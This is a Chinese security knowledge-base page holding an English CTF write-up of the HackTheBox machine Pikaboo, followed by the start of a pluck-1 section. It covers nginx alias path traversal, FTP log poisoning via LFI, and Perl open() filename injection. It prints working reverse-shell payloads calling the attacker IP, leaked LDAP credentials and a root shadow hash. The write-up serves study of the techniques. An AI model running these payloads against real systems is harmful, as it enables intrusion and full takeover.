---
title: 路径归一化、文件包含与日志内容
date: '2026-11-25 12:00:00'
updated: '2026-11-25 12:00:00'
lang: zh-CN
permalink: knowledge/files/
categories:
- Web安全
- 文件与路径
tags:
- 知识库
- 路径穿越
- LFI
- 日志注入
- Perl
- PHP
- SSH
- Exim
- Wine
- sudo
- Unicode
- JWT
- Python
description: 路径的字符串表示、Web 映射和文件系统解析可能不同。本章保留 alias、Unicode、PHP 流包装器及日志内容如何影响读取或执行，同时保留源码与实际响应的对照。
knowledge: true
copyright: true
toc:
  enable: true
  number: false
  max_depth: 2
---

路径的字符串表示、Web 映射和文件系统解析可能不同。本章保留 alias、Unicode、PHP 流包装器及日志内容如何影响读取或执行，同时保留源码与实际响应的对照。

<nav class="kb-tools" aria-label="章节操作">
<a href="/knowledge/">知识库目录</a>
<a href="/guide/">研究导读</a>
<a href="/knowledge/files/source.md" download>下载 Markdown</a>
<button type="button" data-expand-evidence>展开全部技术记录</button>
</nav>

<!--more-->

## 分析重点

Pikaboo 连接 alias、文件包含、FTP 日志和 Perl open。

Unicode 的 off-by-slash 与归一化发生在不同边界，原输入形式全部保留。

Pluck、W1R3S 与 Sunrise 继续展示私钥、菜单、文件服务与提权分支。

## 案例与技术索引

| 分析入口 | 实验来源 | 技术点 |
| --- | --- | --- |
| [alias 路径、日志内容与 Perl open](#case-pikaboo) | pikaboo | 路径穿越、LFI、日志注入、Perl |
| [PHP 流包装器与受限菜单](#case-pluck-1) | pluck-1 | LFI、PHP、SSH、Exim |
| [Weborf 读取与 Wine 执行](#case-sunset-sunrise) | sunset-sunrise | 路径穿越、Wine、sudo |
| [Unicode 归一化与路径判断](#case-unicode) | unicode | Unicode、路径穿越、JWT、Python |
| [Cuppa 解析器与系统文件](#case-w1r3s-1-0-1) | W1R3S-1-0-1 | LFI、Cuppa、文件读取 |

<a id="case-pikaboo"></a>

## alias 路径、日志内容与 Perl open

nginx alias 映射的差异暴露文件包含，FTP 日志内容连接执行；后续 LDAP 资料和 Perl open 的调用方式构成独立提权段。

<p class="kb-provenance">来源 pikaboo · 原记录 2021-07-20 · 27 个代码块 · 13 处图片引用</p>

<details class="kb-evidence" id="record-pikaboo">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pikaboo -->

#### introduce

OS: Linux
Difficulty: Hard
Points:	40
Release:	17 Jul 2021
IP:	10.10.10.249

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2022.jpg)

 - ![my htb rank](http://www.hackthebox.eu/badge/image/235857)



#### Enumeration

use nmap as usual

``` bash
# Nmap 7.91 scan initiated Sun Jul 18 01:44:59 2021 as: nmap -vvv -p 21,22,80 -A -v -oN intial.nmap 10.129.185.25
Nmap scan report for pikaboo.htb (10.129.185.25)
Host is up, received syn-ack (0.32s latency).
Scanned at 2021-07-18 01:45:01 EDT for 18s

PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 17:e1:13:fe:66:6d:26:b6:90:68:d0:30:54:2e:e2:9f (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAgG6pLBPMmXneLGYurX9xbt6cE2IYdEN9J/ijCVrQbpUyVeTNWNoFnpB8+DIcppOtsJu0X3Iwpfb1eTmuop8q9nNlmyOcOTBHYOYLQwa+G4e90Bsku86ndqs+LU09sjqss5n3XdZoFqunNfZb7EirVVCgI80Lf8F+3XRRIX3ErqNrk2LiaQQY6fcAaNALaQy9ked7KydWDFYizO2dnu8ee2ncdXFMBeVDKGVfrlHAoRFoTmCEljCP1Vsjt69NDBudCGJBgU1MbItTF7DtbNQWGQmw8/9n9Jq8ic/YxOnIKRDDUuuWdE3sy2dPiw0ZVuG7V2GnkkMsGv0Qn3Uq9Qx7
|   256 92:86:54:f7:cc:5a:1a:15:fe:c6:09:cc:e5:7c:0d:c3 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIJl6Z/XtGXJwSnO57P3CesJfRbmGNra4AuSSHCGUocKchdp3JnNE704lMnocAevDwi9HsAKARxCup18UpPHz+I=
|   256 f4:cd:6f:3b:19:9c:cf:33:c6:6d:a5:13:6a:61:01:42 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINyHVcrR4jjhBG5vZsvKRsKO4SnXj3GqeMtwvFSvd4B4
80/tcp open  http    syn-ack nginx 1.14.2
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.14.2
|_http-title: Pikaboo
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Jul 18 01:45:19 2021 -- 1 IP address (1 host up) scanned in 20.01 seconds
```

Looks like we have 3 ports FTP,SSH and WEB.
Let's check FTP for anonymous login.

#### FTP
#### Anonymous Login

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ftp pikaboo.htb 
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): anonymous
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> 
```

Looks like we don't have anonymous login so it is a dead end for now until we have some creds for it.

#### Web
#### Visiting website

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2023.jpg)

Not much here there is a contact page but not much there as we cannot submit the form.
Then we have another page called pokatdex aka pokedex(For Pokemon fans like me).
Not necessary for the machine but had to put it in.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2024.jpg)

Just checking for any pokemon in there we are redirected to the link.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2025.jpg)

Here we have the link for the api but looks like it still is under construction so not much from here.
And finally there is admin page with requires basic authentication for logging in.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2026.jpg)

Default creds and bruteforce should not work as this is hardbox so let's think something other than that.

#### Intresting thing

Clicking cancel on the basic authentication dialogue box gives us something intresting.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2027.jpg)

In the image you can see that it is saying it is using apache server on port 81 so there is two intresting thing first is why port 81 instead  of standard port 80 but we will get back to that later and another is nmap says it's nginx not apache so there must some sort of traffic forwarding and reverse proxy running on the backend and now to the port 81 part as nginx is running onport 80 that is why apache is on port 81 as both should be hosted on same machine.

#### Enumeration

Looking for version and exploit it seems to be running latest versions of both apache and nginx but I came across this article which specified that there could be path traversal due to misconfigured alias in nginx.

https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/

so I thought to give it a try as it is pretty easy just go to the endpoint which ask for the creds and then use ../ and then go to the desired directory so I decided to give it a try.

#### Fuzzing

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../FUZZ -w /usr/share/wordlists/dirb/big.txt -t 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
admin                   [Status: 401, Size: 456, Words: 42, Lines: 15]
javascript              [Status: 301, Size: 314, Words: 20, Lines: 10]
server-status           [Status: 200, Size: 5531, Words: 265, Lines: 110]
:: Progress: [20469/20469] :: Job [1/1] :: 667 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

Looks like we have found few directories most of then doesn't look intresting but server-status which is mostly forbidden is now giving 200 status code so let's check that out.

#### Visiting potentially intresting endpoint

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2028.jpg)

we have something like this if you go through the whole you can find this intresting part.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2029.jpg)

Now we know we can access admin_staging endpoint using this trick.
Visting that endpoint it looks like.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2030.jpg)

so let's just see the dashboad so now we finally have admin dashboard or that is what I am assuming at the moment.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2031.jpg)

looks at the url it looks fishy as it just directly calling the php page so there could be potential LFI there.
so let's FUZZ for that as this box doesn't have rate limiting and fuzzing is extremly fast so it would be just a couple of seconds.

#### Fuzzing For LFI

I prefer using LFI-Jhaddix.txt for fuzzing as it has cool variations in the payload with the list of potentially useful files.
You can download this wordlist from here https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/LFI/LFI-Jhaddix.txt

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ffuf -u http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -t 200 -c -fs 15349

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://pikaboo.htb/admin../admin_staging/index.php?page=FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 15349
________________________________________________

/var/log/lastlog        [Status: 200, Size: 307641, Words: 3272, Lines: 368]
/var/log/vsftpd.log     [Status: 200, Size: 19803, Words: 3893, Lines: 414]
/var/log/wtmp           [Status: 200, Size: 166983, Words: 3288, Lines: 559]
:: Progress: [914/914] :: Job [1/1] :: 314 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

Looks like we have access to logs so if we would have tried to find this LFI manually we wouldn't be successful until and unless you are genius and remebered that we have FTP also. But let's be honesh everyone tries /etc/passwd to check.

Anyways now we have the FTP log file so the first thing that came to my mind was FTP-log poisoing so if you don't what that is, it is basically just the injecting PHP code in the FTP log and then later make web server execute that piece of code with the help of LFI.

If you wanna learn more about it you can refer below articles.

https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d

https://secnhack.in/ftp-log-poisoning-through-lfi/

#### Exploitation

Looking at the logs we can also find the username but let's go for LFI.
We got the log file 

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2032.jpg)

``` bash
http://10.10.10.249/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

Now let's try and get revshell from that.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): <?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.14.11/2233 0>&1'"); ?>
331 Please specify the password.
Password:
530 Login incorrect.
Login failed.
ftp> exit
221 Goodbye.
```

and the password can be anything and then just start the nc listerner.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ curl http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log
```

And Boom we have the reverse shell.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pikaboo]
└─# nc -lvp 2233                                                                                                                  
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2233
Ncat: Listening on 0.0.0.0:2233
Ncat: Connection from 10.10.10.249.
Ncat: Connection from 10.10.10.249:46682.
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
whoami
www-data
```

#### Gaining User
#### Enumeration

Let's check for all the running services on the box

``` bash
www-data@pikaboo:/opt/pokeapi$ ss -tupln
Netid   State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port                                                                                   
udp     UNCONN   0        0                0.0.0.0:68            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:80            0.0.0.0:*       users:(("nginx",pid=601,fd=6),("nginx",pid=600,fd=6))                          
tcp     LISTEN   0        128            127.0.0.1:81            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128              0.0.0.0:22            0.0.0.0:*                                                                                      
tcp     LISTEN   0        128            127.0.0.1:389           0.0.0.0:*                                                                                      
tcp     LISTEN   0        128                 [::]:80               [::]:*       users:(("nginx",pid=601,fd=7),("nginx",pid=600,fd=7))                          
tcp     LISTEN   0        32                     *:21                  *:*                                                                                      
tcp     LISTEN   0        128                 [::]:22               [::]:*     
```

Looks like we have LDAP running on the box.
Let's check the home directory for seeing the users/

``` bash
ls /home
pwnmeow
```

Looks like we have only one user.

``` bash
ls -al /home/pwnmeow
total 580
drwxr-xr-x 2 pwnmeow pwnmeow  569344 Jul  6 20:02 .
drwxr-xr-x 3 root    root       4096 May 10 10:26 ..
lrwxrwxrwx 1 root    root          9 Jul  6 20:02 .bash_history -> /dev/null
-rw-r--r-- 1 pwnmeow pwnmeow     220 May 10 10:26 .bash_logout
-rw-r--r-- 1 pwnmeow pwnmeow    3526 May 10 10:26 .bashrc
-rw-r--r-- 1 pwnmeow pwnmeow     807 May 10 10:26 .profile
lrwxrwxrwx 1 root    root          9 Jul  6 20:01 .python_history -> /dev/null
-r--r----- 1 pwnmeow www-data     33 Jul 17 22:06 user.txt
```

An unusual .python_history file is there so let's check it out.
Looking for intresting things I checked /opt directory.

``` bash
ls /opt
pokeapi
```

We found the under construction version of pokeapi so there could be exploit but we can't exploit it but what we can do is to find hardcoded creds in it as developers might have left it as it is still not implemented.

``` bash
cd /opt/pokeapi
www-data@pikaboo:/opt/pokeapi$ ls
CODE_OF_CONDUCT.md  README.md         data                pokemon_v2
CONTRIBUTING.md     Resources         docker-compose.yml  requirements.txt
CONTRIBUTORS.txt    __init__.py       graphql             test-requirements.txt
LICENSE.md          apollo.config.js  gunicorn.py.ini
Makefile            config            manage.py
```

Let's just try and grep for passwords from the files.

``` bash
www-data@pikaboo:/opt/pokeapi$ grep -iRl 'password'
.github/workflows/docker-image.yml
Resources/compose/docker-compose-prod-graphql.yml
Resources/docker/app/README.md
docker-compose.yml
config/docker.py
config/settings.py
config/docker-compose.py
```

We have some files which has the word password in it the most intresting file is config/settings.py so let's see that.
Checking that file out you can see this good part.

``` bash
DATABASES = {                                                                                                                                                         
    "ldap": {                                                                                                                                                         
        "ENGINE": "ldapdb.backends.ldap",                                                                                                                             
        "NAME": "ldap:///",                                                                                                                                           
        "USER": "cn=binduser,ou=users,dc=pikaboo,dc=htb",                                                                                                             
        "PASSWORD": "J~42%W?PFHl]g",                                                                                                                                  
    },                                                                                                                                                                
    "default": {                                                                                                                                                      
        "ENGINE": "django.db.backends.sqlite3",                                                                                                                       
        "NAME": "/opt/pokeapi/db.sqlite3",                                                                                                                            
    }                                                                                                                                                                 
}  
```

we can see LDAP creds and we know the ldap is running so let's try to enumerate it with creds we found.

``` bash
www-data@pikaboo:/opt/pokeapi$ ldapsearch -D "cn=binduser,ou=users,dc=pikaboo,dc=htb" -w 'J~42%W?PFHl]g' -b 'dc=pikaboo,dc=htb' -LLL -h 127.0.0.1 -p 389 -s sub "(objectClass=*)"
<--SNIP-->
dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb
objectClass: inetOrgPerson
objectClass: posixAccount
objectClass: shadowAccount
uid: pwnmeow
cn: Pwn
sn: Meow
loginShell: /bin/bash
uidNumber: 10000
gidNumber: 10000
homeDirectory: /home/pwnmeow
userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==
<--SNIP-->
```

Looking at the LDAP dump we can see the creds for the user pwnmeow.
so let's base64 decode that creds.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ echo "X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==" | base64 -d
_G0tT4_C4tcH_'3m_4lL!_
```

We have the password for the user pwnmeow but the catch over here is that we cannot su into pwnmeow with that creds neither you can use it to SSH.

So from beginning we know that FTP also has the user pwnmeow from the logs that we saw from local file inclusion so let's try this cred there.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

And boom it worked so let's enumerate futher.

#### PrivESC TO Root
#### Enumeration

let's see if there is any cron running.

``` bash
www-data@pikaboo:/opt/pokeapi$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/csvupdate_cron
```

Looks like we have a script that is been executed as root every single second.
so let's look into script.

``` bash
www-data@pikaboo:/opt/pokeapi$ cat /usr/local/bin/csvupdate_cron
#!/bin/bash

for d in /srv/ftp/*
do
  cd $d
  /usr/local/bin/csvupdate $(basename $d) *csv
  /usr/bin/rm -rf *
done
```

looks like it is just a simple bash script to run another script /usr/local/bin/csvupdate with the filename as the parameter for the files in FTP and now as we have access to FTP we might be able to exploit it.

so let's look at the /usr/local/bin/csvupdate file.

``` perl
#!/usr/bin/perl

##################################################################
# Script for upgrading PokeAPI CSV files with FTP-uploaded data. #
#                                                                #
# Usage:                                                         #
# ./csvupdate <type> <file(s)>                                   #
#                                                                #
# Arguments:                                                     #
# - type: PokeAPI CSV file type                                  #
#         (must have the correct number of fields)               #
# - file(s): list of files containing CSV data                   #
##################################################################

use strict;
use warnings;
use Text::CSV;

my $csv_dir = "/opt/pokeapi/data/v2/csv";

my %csv_fields = (
  'abilities' => 4,
  'ability_changelog' => 3,
  'ability_changelog_prose' => 3,
  'ability_flavor_text' => 4,
  'ability_names' => 3,
  'ability_prose' => 4,
  'berries' => 10,
  'berry_firmness' => 2,
  'berry_firmness_names' => 3,
  'berry_flavors' => 3,
  'characteristics' => 3,
  'characteristic_text' => 3,
  'conquest_episode_names' => 3,
  'conquest_episodes' => 2,
  'conquest_episode_warriors' => 2,
  'conquest_kingdom_names' => 3,
  'conquest_kingdoms' => 3,
  'conquest_max_links' => 3,
  'conquest_move_data' => 7,
  'conquest_move_displacement_prose' => 5,
  'conquest_move_displacements' => 3,
  'conquest_move_effect_prose' => 4,
  'conquest_move_effects' => 1,
  'conquest_move_range_prose' => 4,
  'conquest_move_ranges' => 3,
  'conquest_pokemon_abilities' => 3,
  'conquest_pokemon_evolution' => 8,
  'conquest_pokemon_moves' => 2,
  'conquest_pokemon_stats' => 3,
  'conquest_stat_names' => 3,
  'conquest_stats' => 3,
  'conquest_transformation_pokemon' => 2,
  'conquest_transformation_warriors' => 2,
  'conquest_warrior_archetypes' => 2,
  'conquest_warrior_names' => 3,
  'conquest_warrior_ranks' => 4,
  'conquest_warrior_rank_stat_map' => 3,
  'conquest_warriors' => 4,
  'conquest_warrior_skill_names' => 3,
  'conquest_warrior_skills' => 2,
  'conquest_warrior_specialties' => 3,
  'conquest_warrior_stat_names' => 3,
  'conquest_warrior_stats' => 2,
  'conquest_warrior_transformation' => 10,
  'contest_combos' => 2,
  'contest_effect_prose' => 4,
  'contest_effects' => 3,
  'contest_type_names' => 5,
  'contest_types' => 2,
  'egg_group_prose' => 3,
  'egg_groups' => 2,
  'encounter_condition_prose' => 3,
  'encounter_conditions' => 2,
  'encounter_condition_value_map' => 2,
  'encounter_condition_value_prose' => 3,
  'encounter_condition_values' => 4,
  'encounter_method_prose' => 3,
  'encounter_methods' => 3,
  'encounters' => 7,
  'encounter_slots' => 5,
  'evolution_chains' => 2,
  'evolution_trigger_prose' => 3,
  'evolution_triggers' => 2,
  'experience' => 3,
  'genders' => 2,
  'generation_names' => 3,
  'generations' => 3,
  'growth_rate_prose' => 3,
  'growth_rates' => 3,
  'item_categories' => 3,
  'item_category_prose' => 3,
  'item_flag_map' => 2,
  'item_flag_prose' => 4,
  'item_flags' => 2,
  'item_flavor_summaries' => 3,
  'item_flavor_text' => 4,
  'item_fling_effect_prose' => 3,
  'item_fling_effects' => 2,
  'item_game_indices' => 3,
  'item_names' => 3,
  'item_pocket_names' => 3,
  'item_pockets' => 2,
  'item_prose' => 4,
  'items' => 6,
  'language_names' => 3,
  'languages' => 6,
  'location_area_encounter_rates' => 4,
  'location_area_prose' => 3,
  'location_areas' => 4,
  'location_game_indices' => 3,
  'location_names' => 4,
  'locations' => 3,
  'machines' => 4,
  'move_battle_style_prose' => 3,
  'move_battle_styles' => 2,
  'move_changelog' => 10,
  'move_damage_classes' => 2,
  'move_damage_class_prose' => 4,
  'move_effect_changelog' => 3,
  'move_effect_changelog_prose' => 3,
  'move_effect_prose' => 4,
  'move_effects' => 1,
  'move_flag_map' => 2,
  'move_flag_prose' => 4,
  'move_flags' => 2,
  'move_flavor_summaries' => 3,
  'move_flavor_text' => 4,
  'move_meta_ailment_names' => 3,
  'move_meta_ailments' => 2,
  'move_meta_categories' => 2,
  'move_meta_category_prose' => 3,
  'move_meta' => 13,
  'move_meta_stat_changes' => 3,
  'move_names' => 3,
  'moves' => 15,
  'move_target_prose' => 4,
  'move_targets' => 2,
  'nature_battle_style_preferences' => 4,
  'nature_names' => 3,
  'nature_pokeathlon_stats' => 3,
  'natures' => 7,
  'pal_park_area_names' => 3,
  'pal_park_areas' => 2,
  'pal_park' => 4,
  'pokeathlon_stat_names' => 3,
  'pokeathlon_stats' => 2,
  'pokedexes' => 4,
  'pokedex_prose' => 4,
  'pokedex_version_groups' => 2,
  'pokemon_abilities' => 4,
  'pokemon_color_names' => 3,
  'pokemon_colors' => 2,
  'pokemon' => 8,
  'pokemon_dex_numbers' => 3,
  'pokemon_egg_groups' => 2,
  'pokemon_evolution' => 20,
  'pokemon_form_generations' => 3,
  'pokemon_form_names' => 4,
  'pokemon_form_pokeathlon_stats' => 5,
  'pokemon_forms' => 10,
  'pokemon_form_types' => 3,
  'pokemon_game_indices' => 3,
  'pokemon_habitat_names' => 3,
  'pokemon_habitats' => 2,
  'pokemon_items' => 4,
  'pokemon_move_method_prose' => 4,
  'pokemon_move_methods' => 2,
  'pokemon_moves' => 6,
  'pokemon_shape_prose' => 5,
  'pokemon_shapes' => 2,
  'pokemon_species' => 20,
  'pokemon_species_flavor_summaries' => 3,
  'pokemon_species_flavor_text' => 4,
  'pokemon_species_names' => 4,
  'pokemon_species_prose' => 3,
  'pokemon_stats' => 4,
  'pokemon_types' => 3,
  'pokemon_types_past' => 4,
  'region_names' => 3,
  'regions' => 2,
  'stat_names' => 3,
  'stats' => 5,
  'super_contest_combos' => 2,
  'super_contest_effect_prose' => 3,
  'super_contest_effects' => 2,
  'type_efficacy' => 3,
  'type_game_indices' => 3,
  'type_names' => 3,
  'types' => 4,
  'version_group_pokemon_move_methods' => 2,
  'version_group_regions' => 2,
  'version_groups' => 4,
  'version_names' => 3,
  'versions' => 3
);


if($#ARGV < 1)
{
  die "Usage: $0 <type> <file(s)>\n";
}

my $type = $ARGV[0];
if(!exists $csv_fields{$type})
{
  die "Unrecognised CSV data type: $type.\n";
}

my $csv = Text::CSV->new({ sep_char => ',' });

my $fname = "${csv_dir}/${type}.csv";
open(my $fh, ">>", $fname) or die "Unable to open CSV target file.\n";

shift;
for(<>)
{
  chomp;
  if($csv->parse($_))
  {
    my @fields = $csv->fields();
    if(@fields != $csv_fields{$type})
    {
      warn "Incorrect number of fields: '$_'\n";
      next;
    }
    print $fh "$_\n";
  }
}

close($fh);
```

Looking through the perl script we can see takes the file name as argument.

Looking for the vulnerability in perl file open.

I came across this question in stackoverflow.

https://stackoverflow.com/questions/26614348/perl-open-injection-prevention

which than increased my curosity to learn more as answer didn't explain a good way to exploit and looking for the exploit for that I stumbled upon this article.

https://wiki.sei.cmu.edu/confluence/pages/viewpage.action?pageId=88890543

which explained the exploit in detailed.

The exploit basically is that if the filename starts with '|' then the rest of file name will be executed as command rather than the file name itself so I build up a payload for that.

``` python
|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.11\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv
```

So this is the file name that I come up with and I will tell why this shell as the command is passed through basename so ant '/' will just split the payload and mess with the working of the payload.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ basename '/bin/bash'
bash
```

So as we can see above we cannot use the bash payload as due to below.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ basename 'bash -c "bash -i >& /dev/tcp/10.10.14.11/12345 0>&1"'
12345 0>&1"
```

So basically it will just send '12345 0>&1' to the perl script and your payload cannot execute so thats why I chose python payload.
So let's create the file.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ touch "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.11\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"sh\")';echo .csv"
```

and we need .csv at the as to bypass the check in the bash script.
Now let's upload the file but before that start the nc listener on that port.

``` bash
kali@kali:~/HackTheBox/Pikaboo$ ftp 10.10.10.249
Connected to pikaboo.htb.
220 (vsFTPd 3.0.3)
Name (pikaboo.htb:kali): pwnmeow
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd versions
250 Directory successfully changed.
ftp> put oops "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.11\",1234));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"
local: oops remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"10.10.14.11\",1234));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
ftp>
```

After uploading file please wait for sometime as it can take a while.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/pikaboo]
└─# rlwrap nc -nlvp 1234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.10.249.
Ncat: Connection from 10.10.10.249:58646.
id
id
uid=0(root) gid=0(root) groups=0(root)
whoami
whoami
root
cd /home
cd /home
ls
ls
pwnmeow
cd pwnmeow
cd pwnmeow
cat user.txt
cat user.txt
cb47b6a019e8819d1878916f455df5d7
cd /root
cd /root
cat root.txt
cat root.txt
b74d229c4d4f28e7c813a07e5255d456
cat /etc/shadow | grep root
cat /etc/shadow | grep root
root:$6$rmBpCrNSohpbrXpW$6XizSEcAl0ELQH28F21.V0cvZgWCNkatRbXCv5WNlIW2mkhECPM7wm1j.BRD.t7.Z5CQPvu19EGORXbpOnb540:18816:0:99999:7:::
```

And boom we are root so let's get all the flags.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2033.jpg)

#### Summary of knowledge

 - path traversal via misconfigured nginx alias
 - LFI fuzzing with seclists' LFI-Jhaddix.txt
 - ftp log poisoning through lfi to get revshell
 - LDAP enumeration with leaked pass
 - cronjob and perl open() injection to privesc
 - python revshell payload bypass check

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end pikaboo -->

</details>

<a id="case-pluck-1"></a>

## PHP 流包装器与受限菜单

php://filter 提供文件读取，备份和私钥连接 SSH 菜单。原文继续对照 vim、Exim 和 Dirty COW 的不同提权条件。

<p class="kb-provenance">来源 pluck-1 · 原记录 2020-04-08 · 17 个代码块 · 5 处图片引用</p>

<details class="kb-evidence" id="record-pluck-1">
<summary>查看分析过程、攻击步骤与完整代码</summary>

<!-- kb:start pluck-1 -->

#### 名称
名称：pluck: 1
发布日期：2017年3月11日

#### 下载

pluck.ova.zip

